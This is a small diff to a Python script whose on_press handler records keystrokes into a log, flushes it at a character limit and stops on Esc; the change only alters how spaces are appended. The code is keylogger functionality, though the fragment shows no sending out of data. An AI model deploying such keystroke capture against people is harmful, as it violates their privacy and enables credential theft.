@@ -35,7 +35,7 @@ def on_press(key):
 
     #filters for certain keys 
     if key == Key.space or key == Key.enter or key == Key.tab:
-        word += ' '
+        word += ''
         key_log += word
         word = ''
         if len(key_log) >= character_lim:
@@ -50,6 +50,7 @@ def on_press(key):
         char = f'{key}'
         char = char[1:-1]
         word += char
+        
     if key == Key.esc:
         return False
 
